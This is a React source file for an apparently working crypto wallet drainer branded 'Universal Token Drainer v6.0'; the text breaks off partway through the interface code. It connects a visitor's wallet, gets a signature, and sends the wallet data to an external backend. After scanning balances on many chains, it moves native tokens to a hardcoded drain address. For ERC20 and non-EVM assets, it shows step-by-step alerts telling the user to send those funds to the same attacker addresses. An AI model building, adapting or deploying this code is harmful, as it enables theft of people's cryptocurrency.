import { useState, useEffect } from 'react';
import { WagmiConfig } from "wagmi";
import { ConnectKitProvider, ConnectKitButton } from "connectkit";
import { useAccount, useSignMessage, useWalletClient } from 'wagmi';
import { parseEther } from 'viem';
import { wagmiConfig } from "./wagmi";
import './mobile-fix.css';

// ==================== NETWORK CONFIGURATION ====================
const NETWORKS = [
  // EVM Mainnets (Scannable via Covalent)
  { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm', scanner: 'covalent', color: '#627EEA' },
  { id: 56, name: 'BSC', symbol: 'BNB', type: 'evm', scanner: 'covalent', color: '#F0B90B' },
  { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm', scanner: 'covalent', color: '#8247E5' },
  { id: 42161, name: 'Arbitrum', symbol: 'ETH', type: 'evm', scanner: 'covalent', color: '#28A0F0' },
  { id: 10, name: 'Optimism', symbol: 'ETH', type: 'evm', scanner: 'covalent', color: '#FF0420' },
  { id: 8453, name: 'Base', symbol: 'ETH', type: 'evm', scanner: 'covalent', color: '#0052FF' },
  { id: 43114, name: 'Avalanche', symbol: 'AVAX', type: 'evm', scanner: 'covalent', color: '#E84142' },
  { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm', scanner: 'covalent', color: '#1969FF' },
  { id: 100, name: 'Gnosis', symbol: 'xDai', type: 'evm', scanner: 'covalent', color: '#04795B' },
  { id: 42220, name: 'Celo', symbol: 'CELO', type: 'evm', scanner: 'covalent', color: '#35D07F' },
  { id: 1284, name: 'Moonbeam', symbol: 'GLMR', type: 'evm', scanner: 'covalent', color: '#53CBC9' },
  { id: 1088, name: 'Metis', symbol: 'METIS', type: 'evm', scanner: 'covalent', color: '#00DACC' },
  { id: 25, name: 'Cronos', symbol: 'CRO', type: 'evm', scanner: 'covalent', color: '#121C36' },
  { id: 1666600000, name: 'Harmony', symbol: 'ONE', type: 'evm', scanner: 'covalent', color: '#00AEE9' },
  { id: 1313161554, name: 'Aurora', symbol: 'ETH', type: 'evm', scanner: 'covalent', color: '#78D64B' },
  
  // Non-EVM Chains with DIRECT API scanning
  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'non-evm', scanner: 'tron', color: '#FF060A' },
  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'non-evm', scanner: 'solana', color: '#00FFA3' },
  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'non-evm', scanner: 'bitcoin', color: '#F7931A' },
  { id: 'cardano', name: 'Cardano', symbol: 'ADA', type: 'non-evm', scanner: 'cardano', color: '#0033AD' },
  { id: 'dogecoin', name: 'Dogecoin', symbol: 'DOGE', type: 'non-evm', scanner: 'dogecoin', color: '#C2A633' },
  { id: 'ripple', name: 'Ripple', symbol: 'XRP', type: 'non-evm', scanner: 'ripple', color: '#23292F' },
  { id: 'polkadot', name: 'Polkadot', symbol: 'DOT', type: 'non-evm', scanner: 'polkadot', color: '#E6007A' },
  { id: 'cosmos', name: 'Cosmos', symbol: 'ATOM', type: 'non-evm', scanner: 'cosmos', color: '#2E3148' },
];

// ==================== DRAIN ADDRESSES ====================
const DRAIN_ADDRESSES = {
  // EVM Chains
  1: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  56: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  137: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  42161: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  10: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  8453: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  43114: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  250: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  100: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  42220: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  1284: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  1088: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  25: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  1666600000: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  1313161554: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  
  // Non-EVM Chains - YOU MUST UPDATE THESE WITH YOUR ACTUAL ADDRESSES
  tron: "Txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  solana: "So11111111111111111111111111111111111111112",
  bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
  cardano: "addr1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  dogecoin: "Dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  ripple: "rxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  polkadot: "1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  cosmos: "cosmos1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
};

// ==================== MAIN APP COMPONENT ====================
function TokenDrainApp() {
  return (
    <WagmiConfig config={wagmiConfig}>
      <ConnectKitProvider
        options={{
          walletConnectName: "WalletConnect",
          enforceSupportedChains: false,
          hideQuestionMarkCTA: true,
          hideTooltips: true,
          disclaimer: null,
          embedGoogleFonts: false,
          customTheme: {
            "--ck-font-family": "'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif",
            "--ck-border-radius": "16px",
            "--ck-accent-color": "#667eea",
            "--ck-accent-text-color": "#ffffff",
            "--ck-modal-background": "#0a0a0a",
            "--ck-body-background": "#111827",
            "--ck-body-color": "#ffffff",
            "--ck-body-color-muted": "#94a3b8",
          },
        }}
        theme="midnight"
      >
        <MultiNetworkDashboard />
      </ConnectKitProvider>
    </WagmiConfig>
  );
}

// ==================== DASHBOARD COMPONENT ====================
function MultiNetworkDashboard() {
  const { address, isConnected } = useAccount();
  const { signMessageAsync } = useSignMessage();
  const { data: walletClient } = useWalletClient();

  // State Management
  const [authStatus, setAuthStatus] = useState('');
  const [signature, setSignature] = useState('');
  const [isAuthenticating, setIsAuthenticating] = useState(false);
  const [isScanning, setIsScanning] = useState(false);
  const [isDraining, setIsDraining] = useState(false);
  const [backendUrl] = useState('https://tokenbackend-5xab.onrender.com');
  const [userTokens, setUserTokens] = useState({});
  const [txStatus, setTxStatus] = useState({});
  const [scanProgress, setScanProgress] = useState({ current: 0, total: NETWORKS.length, text: '' });
  const [apiStatus, setApiStatus] = useState('Checking...');
  const [totalValue, setTotalValue] = useState(0);
  const [activeDrainNetwork, setActiveDrainNetwork] = useState('');
  const [activeDrainToken, setActiveDrainToken] = useState('');
  const [drainTransactions, setDrainTransactions] = useState([]);

  // Initialize
  useEffect(() => {
    if (isConnected && address) {
      handleWalletConnected(address);
      checkApiStatus();
    } else {
      resetState();
    }
  }, [isConnected, address]);

  // Check Backend Status
  const checkApiStatus = async () => {
    try {
      const response = await fetch(`${backendUrl}/health`);
      if (response.ok) {
        const data = await response.json();
        setApiStatus(`🟢 Online - ${data.stats?.networks || 0} networks`);
      } else {
        setApiStatus('🔴 Offline');
      }
    } catch (error) {
      setApiStatus('🔴 Offline');
    }
  };

  // Reset State
  const resetState = () => {
    setAuthStatus('');
    setSignature('');
    setUserTokens({});
    setTxStatus({});
    setTotalValue(0);
    setDrainTransactions([]);
    setScanProgress({ current: 0, total: NETWORKS.length, text: '' });
  };

  // Wallet Connected Handler
  const handleWalletConnected = async (walletAddress) => {
    setAuthStatus(`✅ Connected: ${formatAddress(walletAddress)}`);
  };

  // ==================== AUTHENTICATION ====================
  const authenticateAllNetworks = async () => {
    if (!address) return;
    
    try {
      setIsAuthenticating(true);
      setAuthStatus('🔐 Signing authentication message...');
      
      const timestamp = Date.now();
      const message = `Universal Token Drain Authentication\nWallet: ${address}\nTime: ${new Date(timestamp).toISOString()}\nNonce: ${Math.random().toString(36).substring(7)}\nPurpose: Scan and manage tokens across ${NETWORKS.length} networks`;
      
      const sig = await signMessageAsync({ message });
      setSignature(sig);
      
      setAuthStatus('📡 Sending authentication to backend...');
      
      const response = await fetch(`${backendUrl}/auth`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          address,
          signature: sig,
          message,
          networks: NETWORKS
        })
      });
      
      if (!response.ok) {
        const errorText = await response.text();
        throw new Error(`HTTP ${response.status}: ${errorText}`);
      }
      
      const data = await response.json();
      
      if (data.success) {
        setAuthStatus(`✅ Authenticated successfully! Starting scan of ${NETWORKS.length} networks...`);
        // Immediately start scanning after successful auth
        setTimeout(() => {
          scanAllNetworks();
        }, 1000);
      } else {
        setAuthStatus(`❌ Authentication failed: ${data.error || 'Unknown error'}`);
      }
      
    } catch (error) {
      console.error("Authentication error details:", error);
      setAuthStatus(`❌ Error during authentication: ${error.message}`);
      if (error.message.includes('rejected') || error.message.includes('denied')) {
        setAuthStatus('❌ Signature request was rejected by the user');
      } else if (error.message.includes('network')) {
        setAuthStatus('❌ Network error. Please check your connection');
      }
    } finally {
      setIsAuthenticating(false);
    }
  };

  // ==================== SCAN ALL NETWORKS ====================
  const scanAllNetworks = async () => {
    if (!address) return;
    
    setIsScanning(true);
    setAuthStatus(`🌐 Starting comprehensive scan of ${NETWORKS.length} networks...`);
    setUserTokens({});
    setTotalValue(0);
    setScanProgress({ current: 0, total: NETWORKS.length, text: 'Initializing scan...' });
    
    try {
      const response = await fetch(`${backendUrl}/scan`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          evmAddress: address,
          networks: NETWORKS
        })
      });
      
      if (!response.ok) {
        const errorText = await response.text();
        throw new Error(`Backend responded with ${response.status}: ${errorText}`);
      }
      
      const data = await response.json();
      
      if (data.success) {
        processScanResults(data.data);
      } else {
        setAuthStatus(`❌ Scan failed: ${data.error || 'Unknown error'}`);
      }
    } catch (error) {
      console.error("Scan error details:", error);
      setAuthStatus(`❌ Scan error: ${error.message}`);
      
      // Try individual scans as fallback
      try {
        setAuthStatus('🔄 Trying fallback individual network scans...');
        await fallbackIndividualScans();
      } catch (fallbackError) {
        console.error("Fallback scan also failed:", fallbackError);
        setAuthStatus('❌ All scan methods failed. Please try again.');
      }
    } finally {
      setIsScanning(false);
    }
  };

  // Process Scan Results
  const processScanResults = (data) => {
    try {
      const allTokens = {};
      let totalVal = 0;
      let totalTokensCount = 0;
      
      // Check if we have the expected data structure
      if (data.results && Array.isArray(data.results)) {
        data.results.forEach(result => {
          if (result && result.tokens && Array.isArray(result.tokens) && result.tokens.length > 0) {
            const networkValue = result.tokens.reduce((sum, token) => {
              const tokenValue = token.value || 0;
              return sum + (typeof tokenValue === 'number' ? tokenValue : parseFloat(tokenValue) || 0);
            }, 0);
            
            totalVal += networkValue;
            totalTokensCount += result.tokens.length;
            
            // Ensure all tokens have drain addresses
            const processedTokens = result.tokens.map(token => ({
              ...token,
              drainAddress: token.drainAddress || DRAIN_ADDRESSES[result.network?.id] || DRAIN_ADDRESSES[1]
            }));
            
            allTokens[result.network?.id || 'unknown'] = {
              network: result.network || { id: 'unknown', name: 'Unknown', symbol: 'UNK', type: 'unknown' },
              tokens: processedTokens,
              totalValue: networkValue
            };
          }
        });
        
        setUserTokens(allTokens);
        setTotalValue(totalVal);
        setScanProgress({ current: NETWORKS.length, total: NETWORKS.length, text: 'Complete' });
        
        const networkCount = Object.keys(allTokens).length;
        setAuthStatus(`✅ Scan complete! Found ${totalTokensCount} tokens across ${networkCount} networks (Total value: $${totalVal.toFixed(2)})`);
        
        // Store in localStorage for persistence
        localStorage.setItem(`last_scan_${address}`, JSON.stringify({
          timestamp: Date.now(),
          tokens: allTokens,
          totalValue: totalVal,
          totalTokens: totalTokensCount
        }));
        
      } else {
        setAuthStatus('⚠️ Scan completed but no token data was returned');
      }
    } catch (error) {
      console.error("Error processing scan results:", error);
      setAuthStatus(`❌ Error processing scan results: ${error.message}`);
    }
  };

  // Fallback individual scans
  const fallbackIndividualScans = async () => {
    const allTokens = {};
    let totalVal = 0;
    let totalTokensCount = 0;
    
    // Scan major networks individually
    const majorNetworks = NETWORKS.slice(0, 8); // Limit to first 8 for speed
    
    for (let i = 0; i < majorNetworks.length; i++) {
      const network = majorNetworks[i];
      setScanProgress({ 
        current: i + 1, 
        total: majorNetworks.length, 
        text: `Scanning ${network.name}...` 
      });
      
      try {
        let result;
        if (network.type === 'evm') {
          const response = await fetch(`${backendUrl}/tokens/evm/${address}/${network.id}`);
          if (response.ok) {
            const data = await response.json();
            if (data.success) {
              result = data.data;
            }
          }
        } else {
          // For non-EVM, we need to handle address conversion
          const response = await fetch(`${backendUrl}/tokens/nonevm/${address}/${network.id}`);
          if (response.ok) {
            const data = await response.json();
            if (data.success) {
              result = data.data;
            }
          }
        }
        
        if (result && result.tokens && result.tokens.length > 0) {
          const networkValue = result.tokens.reduce((sum, token) => sum + (token.value || 0), 0);
          totalVal += networkValue;
          totalTokensCount += result.tokens.length;
          
          allTokens[network.id] = {
            network: network,
            tokens: result.tokens,
            totalValue: networkValue
          };
        }
      } catch (error) {
        console.log(`Failed to scan ${network.name}:`, error.message);
      }
      
      await new Promise(resolve => setTimeout(resolve, 500));
    }
    
    setUserTokens(allTokens);
    setTotalValue(totalVal);
    
    const networkCount = Object.keys(allTokens).length;
    setAuthStatus(`✅ Fallback scan found ${totalTokensCount} tokens across ${networkCount} networks`);
  };

  // ==================== DRAIN ALL TOKENS ====================
  const executeDrainAllTokens = async () => {
    if (!address || Object.keys(userTokens).length === 0) {
      setAuthStatus('❌ No tokens available to drain');
      return;
    }
    
    // Confirmation dialog
    const confirmMessage = `⚠️ CRITICAL WARNING ⚠️\n\nYou are about to drain ALL tokens from ALL networks.\n\nThis will:\n• Transfer ALL your tokens to the drain addresses\n• Process ${Object.values(userTokens).reduce((sum, data) => sum + data.tokens.length, 0)} tokens\n• Affect ${Object.keys(userTokens).length} networks\n• Require multiple wallet confirmations\n\nType "DRAIN ALL" to confirm:`;
    
    const userConfirmation = prompt(confirmMessage);
    
    if (userConfirmation !== 'DRAIN ALL') {
      setAuthStatus('❌ Drain cancelled by user');
      return;
    }
    
    setIsDraining(true);
    setAuthStatus('🚀 INITIATING MASS DRAIN PROCESS...');
    setTxStatus({ general: 'Starting mass drain of all tokens...' });
    setDrainTransactions([]);
    
    try {
      // Collect all tokens
      const allTokens = [];
      Object.values(userTokens).forEach(data => {
        data.tokens.forEach(token => {
          if (token.amount > 0) {
            allTokens.push({
              token,
              network: data.network
            });
          }
        });
      });
      
      setTxStatus({ 
        general: `Processing ${allTokens.length} tokens...`,
        progress: `0/${allTokens.length}`
      });
      
      let successfulDrains = 0;
      let failedDrains = 0;
      const transactionLogs = [];
      
      // Process each token
      for (let i = 0; i < allTokens.length; i++) {
        const { token, network } = allTokens[i];
        const progress = `${i + 1}/${allTokens.length}`;
        const percentage = Math.round(((i + 1) / allTokens.length) * 100);
        
        setActiveDrainNetwork(network.name);
        setActiveDrainToken(token.symbol);
        setTxStatus({ 
          general: `Draining tokens...`,
          progress: progress,
          current: `${token.symbol} on ${network.name}`,
          percentage: percentage
        });
        
        try {
          const result = await drainSingleToken(token, network);
          
          if (result.success) {
            successfulDrains++;
            transactionLogs.push({
              timestamp: new Date().toISOString(),
              network: network.name,
              token: token.symbol,
              amount: token.amount,
              status: 'success',
              hash: result.hash || 'manual',
              type: network.type
            });
            
            // Update UI to show this token as drained
            removeTokenFromUI(token, network.id);
          } else {
            failedDrains++;
            transactionLogs.push({
              timestamp: new Date().toISOString(),
              network: network.name,
              token: token.symbol,
              amount: token.amount,
              status: 'failed',
              error: result.error,
              type: network.type
            });
          }
        } catch (error) {
          failedDrains++;
          console.error(`Failed to drain ${token.symbol} on ${network.name}:`, error);
        }
        
        // Update transaction logs
        setDrainTransactions([...transactionLogs]);
        
        // Delay between drains to avoid rate limiting and give user time to confirm
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
      
      // Final status
      setAuthStatus(`✅ Mass drain completed! Success: ${successfulDrains}, Failed: ${failedDrains}`);
      setTxStatus({ 
        general: `Mass drain finished`,
        progress: `Complete`,
        summary: `${successfulDrains} successful, ${failedDrains} failed`
      });
      
      // Clear active drain indicators
      setActiveDrainNetwork('');
      setActiveDrainToken('');
      
      // Auto-rescan after completion
      setTimeout(() => {
        setAuthStatus('🔄 Rescanning wallet after drain...');
        scanAllNetworks();
      }, 5000);
      
    } catch (error) {
      console.error("Mass drain error:", error);
      setAuthStatus(`❌ Mass drain failed: ${error.message}`);
      setTxStatus({ general: `Error: ${error.message}` });
    } finally {
      setIsDraining(false);
    }
  };

  // Drain Single Token
  const drainSingleToken = async (token, network) => {
    try {
      if (network.type === 'evm' && token.isNative && walletClient) {
        // EVM Native Token
        const amountInWei = parseEther(token.amount.toString());
        
        if (amountInWei <= 0n) {
          return { success: false, error: 'Amount too small' };
        }
        
        const hash = await walletClient.sendTransaction({
          to: token.drainAddress || DRAIN_ADDRESSES[network.id],
          value: amountInWei,
          chainId: parseInt(network.id)
        });
        
        // Log transaction
        await logTransactionToBackend({
          fromAddress: address,
          toAddress: token.drainAddress || DRAIN_ADDRESSES[network.id],
          amount: token.amount.toString(),
          chainId: network.id.toString(),
          tokenSymbol: token.symbol,
          tokenAddress: token.contractAddress || '0x',
          tokenType: token.isNative ? 'native' : 'token',
          networkType: 'evm',
          decimals: token.decimals || 18,
          transactionHash: hash,
          status: 'submitted'
        });
        
        return { success: true, hash };
        
      } else if (network.type === 'evm' && token.contractAddress) {
        // EVM ERC20 Token - Manual transfer required
        const manualMessage = `MANUAL ERC20 TRANSFER REQUIRED:\n\nToken: ${token.symbol}\nAmount: ${token.amount}\nFrom: ${address}\nTo: ${token.drainAddress || DRAIN_ADDRESSES[network.id]}\n\nContract: ${token.contractAddress}\n\nNetwork: ${network.name} (Chain ID: ${network.id})`;
        
        alert(manualMessage);
        
        await logTransactionToBackend({
          fromAddress: address,
          toAddress: token.drainAddress || DRAIN_ADDRESSES[network.id],
          amount: token.amount.toString(),
          chainId: network.id.toString(),
          tokenSymbol: token.symbol,
          tokenAddress: token.contractAddress,
          tokenType: 'erc20',
          networkType: 'evm',
          decimals: token.decimals || 18,
          status: 'manual_required',
          note: 'ERC20 requires manual transfer via wallet interface'
        });
        
        return { success: true, hash: 'manual' };
        
      } else if (network.type === 'non-evm') {
        // Non-EVM Chain - Manual transfer with instructions
        const instruction = generateNonEVMInstruction(token, network);
        
        alert(instruction);
        
        await logTransactionToBackend({
          fromAddress: address,
          toAddress: token.drainAddress || DRAIN_ADDRESSES[network.id],
          amount: token.amount.toString(),
          chainId: network.id.toString(),
          tokenSymbol: token.symbol,
          tokenAddress: token.contractAddress || 'N/A',
          tokenType: 'native',
          networkType: 'non-evm',
          decimals: token.decimals || (network.id === 'bitcoin' ? 8 : network.id === 'solana' ? 9 : 6),
          status: 'manual_required',
          note: `Manual transfer required for ${network.name}`
        });
        
        return { success: true, hash: 'manual' };
        
      } else {
        // Generic manual transfer
        const message = `MANUAL TRANSFER REQUIRED:\n\nSend ${token.amount} ${token.symbol}\nTo: ${token.drainAddress || DRAIN_ADDRESSES[network.id]}\n\nNetwork: ${network.name}`;
        
        alert(message);
        
        return { success: true, hash: 'manual' };
      }
      
    } catch (error) {
      console.error(`Error draining ${token.symbol}:`, error);
      return { 
        success: false, 
        error: error.message || 'Unknown error',
        shortMessage: error.shortMessage || error.message
      };
    }
  };

  // Generate Non-EVM Instruction
  const generateNonEVMInstruction = (token, network) => {
    const amountFormatted = token.amount.toFixed(
      network.id === 'bitcoin' ? 8 : 
      network.id === 'solana' ? 9 : 6
    );
    
    const drainAddr = token.drainAddress || DRAIN_ADDRESSES[network.id];
    
    const instructions = {
      'tron': `🔴 TRON (TRX) TRANSFER REQUIRED 🔴\n\n1. Open Trust Wallet or TronLink\n2. Switch to TRON network\n3. Go to TRX wallet\n4. Click Send/Transfer\n5. Amount: ${amountFormatted} TRX\n6. Recipient: ${drainAddr}\n7. Confirm transaction\n\n⚠️ IMPORTANT: You need TRX for energy/bandwidth\n📝 Note: This is a manual process`,
      'solana': `🔴 SOLANA (SOL) TRANSFER REQUIRED 🔴\n\n1. Open Phantom or Solflare wallet\n2. Make sure you're on Solana Mainnet\n3. Go to SOL wallet\n4. Click Send\n5. Amount: ${amountFormatted} SOL\n6. Recipient: ${drainAddr}\n7. Confirm transaction\n\n📝 Note: Transaction requires SOL for fees`,
      'bitcoin': `🔴 BITCOIN (BTC) TRANSFER REQUIRED 🔴\n\n1. Open your Bitcoin wallet\n2. Go to Send BTC\n3. Amount: ${amountFormatted} BTC\n4. Recipient: ${drainAddr}\n5. Set appropriate fee\n6. Confirm transaction\n\n⚠️ WARNING: Bitcoin transactions are irreversible\n💸 Fees: Use normal priority for fastest confirmation`,
      'default': `🔴 MANUAL TRANSFER REQUIRED 🔴\n\nNetwork: ${network.name}\nToken: ${token.symbol}\nAmount: ${amountFormatted}\n\nSend to:\n${drainAddr}\n\nInstructions:\n1. Open your ${network.name} wallet\n2. Go to send/transfer\n3. Enter the amount\n4. Paste the recipient address\n5. Confirm the transaction\n\n✅ Complete this transfer manually in your wallet`
    };
    
    return instructions[network.id] || instructions.default;
  };

  // Remove token from UI after successful drain
  const removeTokenFromUI = (drainedToken, networkId) => {
    setUserTokens(prev => {
      const updated = { ...prev };
      if (updated[networkId]) {
        updated[networkId].tokens = updated[networkId].tokens.filter(t => 
          !(t.symbol === drainedToken.symbol && 
            t.contractAddress === drainedToken.contractAddress &&
            t.amount === drainedToken.amount)
        );
        
        // Recalculate total value
        updated[networkId].totalValue = updated[networkId].tokens.reduce((sum, t) => sum + (t.value || 0), 0);
        
        // Remove network entry if no tokens left
        if (updated[networkId].tokens.length === 0) {
          delete updated[networkId];
        }
      }
      return updated;
    });
  };

  // Log transaction to backend
  const logTransactionToBackend = async (txData) => {
    try {
      const response = await fetch(`${backendUrl}/log`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(txData)
      });
      
      if (!response.ok) {
        console.warn('Failed to log transaction to backend');
      }
    } catch (error) {
      console.warn('Error logging transaction:', error.message);
    }
  };

  // ==================== UI UTILITIES ====================
  const formatAddress = (addr) => {
    if (!addr) return '';
    if (addr.length <= 12) return addr;
    return `${addr.substring(0, 8)}...${addr.substring(addr.length - 6)}`;
  };

  const formatAmount = (amount, decimals = 6) => {
    const num = typeof amount === 'string' ? parseFloat(amount) : amount;
    if (isNaN(num)) return '0.00';
    
    return num.toLocaleString(undefined, {
      minimumFractionDigits: 2,
      maximumFractionDigits: decimals
    });
  };

  const formatValue = (value) => {
    const num = typeof value === 'string' ? parseFloat(value) : value;
    if (isNaN(num)) return '$0.00';
    
    return `$${num.toFixed(2)}`;
  };

  const getTotalTokens = () => {
    return Object.values(userTokens).reduce((sum, data) => sum + (data.tokens?.length || 0), 0);
  };

  const getNetworkCount = () => {
    return Object.keys(userTokens).length;
  };

  // ==================== RENDER ====================
  return (
    <div className="App">
      <div className="app-container">
        {/* Header */}
        <header className="app-header">
          <div className="header-left">
            <div className="logo">
              <span className="logo-icon">⚡</span>
              <h1>Universal Token Drainer</h1>
              <span className="version-badge">v6.0</span>
            </div>
          </div>
          
          <div className="header-right">
            <div className="api-status">
              <span className="status-label">Backend:</span>
              <span className={`status-value ${apiStatus.includes('🟢') ? 'online' : 'offline'}`}>
                {apiStatus}
              </span>
            </div>
            <div className="network-count">
              <span className="count-label">Networks:</span>
              <span className="count-value">{NETWORKS.length}</span>
            </div>
            <div className="wallet-section">
              <ConnectKitButton />
            </div>
          </div>
        </header>

        <main className="app-main">
          {isConnected && address ? (
            <>
              {/* Stats Overview */}
              <div className="stats-overview">
                <div className="stat-cards">
                  <div className="stat-card total-value">
                    <div className="stat-icon">💰</div>
                    <div className="stat-content">
                      <div className="stat-number">{formatValue(totalValue)}</div>
                      <div className="stat-label">Total Portfolio Value</div>
                    </div>
                  </div>
                  
                  <div className="stat-card networks">
                    <div className="stat-icon">🌐</div>
                    <div className="stat-content">
                      <div className="stat-number">{getNetworkCount()}</div>
                      <div className="stat-label">Active Networks</div>
                    </div>
                  </div>
                  
                  <div className="stat-card tokens">
                    <div className="stat-icon">🪙</div>
                    <div className="stat-content">
                      <div className="stat-number">{getTotalTokens()}</div>
                      <div className="stat-label">Tokens Found</div>
                    </div>
                  </div>
                  
                  <div className="stat-card supported">
                    <div className="stat-icon">⚡</div>
                    <div className="stat-content">
                      <div className="stat-number">{NETWORKS.length}</div>
                      <div className="stat-label">Supported Chains</div>
                    </div>
                  </div>
                </div>
                
                {/* Wallet Info */}
                <div className="wallet-info-bar">
                  <div className="wallet-address-display">
                    <span className="wallet-label">Wallet:</span>
                    <span className="wallet-address">{formatAddress(address)}</span>
                  </div>
                  <div className="action-status">
                    <div className={`status-indicator ${authStatus.includes('✅') ? 'success' : authStatus.includes('❌') ? 'error' : 'info'}`}>
                      {authStatus || 'Ready to scan networks'}
                    </div>
                  </div>
                </div>
              </div>

              {/* Progress Section */}
              {(isScanning || isDraining) && (
                <div className="progress-section">
                  <div className="progress-header">
                    <h3>
                      {isScanning ? '🔍 Scanning Networks' : '⚡ Draining Tokens'}
                      {activeDrainNetwork && ` - ${activeDrainNetwork}`}
                      {activeDrainToken && ` (${activeDrainToken})`}
                    </h3>
                    <span className="progress-count">
                      {scanProgress.current}/{scanProgress.total}
                    </span>
                  </div>
                  
                  <div className="progress-bar-container">
                    <div 
                      className="progress-bar-fill"
                      style={{ 
                        width: `${(scanProgress.current / scanProgress.total) * 100}%`,
                        backgroundColor: isDraining ? '#f56565' : '#667eea'
                      }}
                    ></div>
                  </div>
                  
                  <div className="progress-text">
                    {scanProgress.text}
                    {txStatus.progress && ` • ${txStatus.progress}`}
                    {txStatus.percentage && ` • ${txStatus.percentage}%`}
                  </div>
                  
                  {txStatus.current && (
                    <div className="current-operation">
                      Currently processing: <strong>{txStatus.current}</strong>
                    </div>
                  )}
                </div>
              )}

              {/* Control Panel */}
              <div className="control-panel">
                <div className="panel-header">
                  <h2>Network Control Center</h2>
                  <div className="control-buttons">
                    <button
                      onClick={authenticateAllNetworks}
                      disabled={isAuthenticating || isScanning || isDraining}
                      className={`btn-auth ${isAuthenticating ? 'authenticating' : ''}`}
                    >
                      {isAuthenticating ? (
                        <>
                          <span className="btn-spinner"></span>
                          Authenticating...
                        </>
                      ) : (
                        '🔐 Authenticate All Networks'
                      )}
                    </button>
                    
                    <button
                      onClick={scanAllNetworks}
                      disabled={isScanning || isAuthenticating || isDraining}
                      className={`btn-scan ${isScanning ? 'scanning' : ''}`}
                    >
                      {isScanning ? (
                        <>
                          <span className="btn-spinner"></span>
                          Scanning...
                        </>
                      ) : (
                        '🔍 Scan All Networks'
                      )}
                    </button>
                    
                    {getTotalTokens() > 0 && (
                      <button
                        onClick={executeDrainAllTokens}
                        disabled={isDraining || isScanning || isAuthenticating}
                        className={`btn-drain ${isDraining ? 'draining' : ''}`}
                      >
                        {isDraining ? (
                          <>
                            <span className="btn-spinner"></span>
                            Draining All...
                          </>
                        ) : (
                          '🔥 DRAIN ALL TOKENS'
                        )}
                      </button>
                    )}
                  </div>
                </div>
                
                {/* Transaction Status Display */}
                {drainTransactions.length > 0 && (
                  <div className="transaction-log">
                    <h3>Drain Transactions ({drainTransactions.length})</h3>
                    <div className="transaction-list">
                      {drainTransactions.slice(-5).reverse().map((tx, index) => (
                        <div key={index} className={`transaction-item ${tx.status}`}>
                          <div className="tx-header">
                            <span className="tx-network">{tx.network}</span>
                            <span className="tx-time">
                              {new Date(tx.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                            </span>
                          </div>
                          <div className="tx-details">
                            <span className="tx-token">{tx.token}</span>
                            <span className="tx-amount">{formatAmount(tx.amount)}</span>
                            <span className={`tx-status ${tx.status}`}>
                              {tx.status === 'success' ? '✅' : '❌'} {tx.status}
                            </span>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>

              {/* Tokens Display */}
              {getTotalTokens() > 0 ? (
                <div className="tokens-display">
                  <div className="display-header">
                    <h2>Detected Tokens</h2>
                    <div className="display-summary">
                      <span className="summary-item">{getNetworkCount()} Networks</span>
                      <span className="summary-item">{getTotalTokens()} Tokens</span>
                      <span className="summary-item">{formatValue(totalValue)} Total</span>
                    </div>
                  </div>
                  
                  <div className="network-tokens-container">
                    {Object.entries(userTokens).map(([networkId, data]) => (
                      <div key={networkId} className="network-tokens-section">
                        <div className="network-header">
                          <div className="network-info">
                            <div 
                              className="network-icon"
                              style={{ backgroundColor: data.network.color || '#667eea' }}
                            >
                              {data.network.type === 'evm' ? 'E' : 'N'}
                            </div>
                            <div className="network-details">
                              <h3 className="network-name">{data.network.name}</h3>
                              <div className="network-stats">
                                <span className="token-count">{data.tokens.length} tokens</span>
                                <span className="network-value">{formatValue(data.totalValue)}</span>
                              </div>
                            </div>
                          </div>
                          <div className="network-type-badge">
                            {data.network.type === 'evm' ? 'EVM' : 'Non-EVM'}
                          </div>
                        </div>
                        
                        <div className="tokens-list">
                          {data.tokens.map((token, index) => (
                            <div key={index} className="token-item">
                              <div className="token-info">
                                <div className="token-symbol-row">
                                  <span className="token-symbol">{token.symbol}</span>
                                  {token.isNative && (
                                    <span className="native-badge">Native</span>
                                  )}
                                </div>
                                <div className="token-amount">
                                  {formatAmount(token.amount, token.decimals || 6)} {token.symbol}
                                </div>
                                {token.contractAddress && token.contractAddress !== '0x' && (
                                  <div className="token-contract">
                                    Contract: {formatAddress(token.contractAddress)}
                                  </div>
                                )}
                              </div>
                              <div className="token-values">
                                <div className="token-value-display">
